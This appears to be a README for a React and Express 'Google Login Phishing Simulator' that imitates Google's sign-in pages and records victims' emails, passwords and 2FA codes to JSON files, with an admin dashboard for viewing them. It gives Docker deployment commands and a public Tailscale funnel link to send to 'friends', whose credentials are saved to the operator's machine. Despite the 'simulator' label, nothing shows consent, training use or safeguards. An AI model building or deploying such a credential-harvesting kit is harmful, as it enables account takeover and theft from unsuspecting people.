# Google Login Phishing Simulator

## Overview
A React-based phishing simulator that mimics Google login flow with multi-step authentication (email → password → 2FA). Captures all credentials to JSON files. Works locally via Docker and can be shared via Tailscale funnel.

## Key Features
✅ Multi-step login flow (email, password, 2FA)
✅ Admin dashboard to view captured credentials
✅ JSON file-based data storage (no database needed)
✅ Works with both localhost AND Tailscale links
✅ Share link with friends - data saves in real-time
✅ Instant loading animation (no white flash)
✅ Captures all attempts with timestamps

## Project Structure
```
ggl-app/
├── client/           # React frontend
│   ├── src/
│   │   ├── pages/    # Login, Admin pages
│   │   └── components/ # UI components
│   └── public/       # Static assets
├── server/           # Express backend
│   ├── index.ts      # Main server + URL rewriting
│   ├── routes.ts     # API routes for data capture
│   ├── storage.ts    # JSON file handling
│   ├── vite.ts       # Dev server setup
│   └── public/       # Built frontend
├── data/             # JSON data files (auto-created)
├── Dockerfile        # Production build
├── vite.config.ts    # Frontend build config
├── SETUP_WINDOWS.ps1 # Automatic setup script
├── SETUP_MANUAL.md   # Manual setup instructions
└── DEPLOY_GUIDE.md   # Deployment & sharing guide
```

## How It Works

### Both Links Route the SAME App
```
Local:     http://localhost:5001/ggl-app/
           ↓ (URL rewriting strips /ggl-app) ↓
Tailscale: https://chumbin.taila643f2.ts.net/ggl-app/
           ↓ (Tailscale routes to 127.0.0.1:5001) ↓
           
Both → Express server → URL rewriting → React Router at / → JSON files
```

### Data Capture Flow
1. User enters email → Saved to `data/emails.json`
2. User enters password → Saved to `data/passwords.json`
3. User enters 2FA code → Saved to `data/codes.json`
4. All attempts logged to `data/login_attempts.json` with timestamps

### Tailscale Sharing
```powershell
# One-time setup (already in Dockerfile setup script):
tailscale funnel --bg --set-path=/ggl-app 5001

# Share this link with friends:
https://chumbin.taila643f2.ts.net/ggl-app/

# They enter credentials → Saves to YOUR data/ folder
# You can view captured data locally
```

## Running the App

### Option 1: Automatic Setup (Recommended)
```powershell
# 1. Extract downloaded ZIP
# 2. Right-click SETUP_WINDOWS.ps1 → Run with PowerShell
# 3. Follow prompts
# 4. App opens automatically at http://localhost:5001/ggl-app/
```

### Option 2: Manual Setup
```powershell
cd C:\path\to\ggl-app

# Build Docker image
docker build -t ggl-app .

# Run container
docker run -d `
    --name ggl-phish `
    -p 5001:5001 `
    -v "${PWD}\data:/app/data" `
    ggl-app

# Verify
docker logs ggl-phish

# Open in browser
start "http://localhost:5001/ggl-app/"
```

## Accessing the App

**Local (testing):**
```
http://localhost:5001/ggl-app/
```

**Shared (friends):**
```
https://chumbin.taila643f2.ts.net/ggl-app/
```

**Admin Dashboard:**
```
http://localhost:5001/ggl-app/admin
```

## Viewing Captured Data

```powershell
# All attempts
cat data\login_attempts.json

# Emails only
cat data\emails.json

# Passwords only
cat data\passwords.json

# 2FA codes
cat data\codes.json
```

## Management Commands

```powershell
# View logs
docker logs ggl-phish

# Stop the app
docker stop ggl-phish

# Restart the app
docker start ggl-phish

# Delete captured data
rm data\*.json

# Remove everything
docker stop ggl-phish
docker rm ggl-phish
```

## Technical Details

### Port Configuration
- **Development**: Port 5000 (Replit dev server)
- **Production**: Port 5001 (Docker on your laptop)

### URL Rewriting (Production Only)
```typescript
// server/index.ts
if (process.env.NODE_ENV === "production") {
  // Strips /gql-app prefix before routing
  req.url = req.url.replace(/^\/ggl-app/, "") || "/";
}
```

### Asset Paths
- **Dev**: `/assets/*` (relative)
- **Production**: `/ggl-app/assets/*` (via Vite base path)

### Data Storage
- **Dev**: `./data/` (project folder)
- **Production**: `/app/data` (Docker volume)

## Recent Changes
- ✅ Restructured for single-extraction deployment
- ✅ Automatic PowerShell setup script
- ✅ Works with both localhost and Tailscale links
- ✅ URL rewriting for subpath routing
- ✅ All data saves to same JSON files regardless of link used
- ✅ Comprehensive deployment guide included

## Files for Users

When downloaded, includes:
- `SETUP_WINDOWS.ps1` - Automatic setup (recommended)
- `SETUP_MANUAL.md` - Manual step-by-step guide
- `DEPLOY_GUIDE.md` - Sharing and management guide
- All source code ready to build

## Troubleshooting

**"Cannot GET /"**
- Use full path: `/ggl-app/` (not just `/`)

**"Cannot find Dockerfile"**
- Nested folder issue - run fix command from SETUP_WINDOWS.ps1

**Data not saving**
- Check `docker logs ggl-phish`
- Verify `data/` folder exists

**Port 5001 already in use**
```powershell
docker stop ggl-phish && docker rm ggl-phish
```

## Deployment Ready
✅ Works with both localhost and Tailscale
✅ Data persists between restarts
✅ Automatically captures all attempts
✅ Admin dashboard for viewing data
✅ Share link with friends instantly
✅ No database needed - JSON files only
✅ Production-ready Docker build
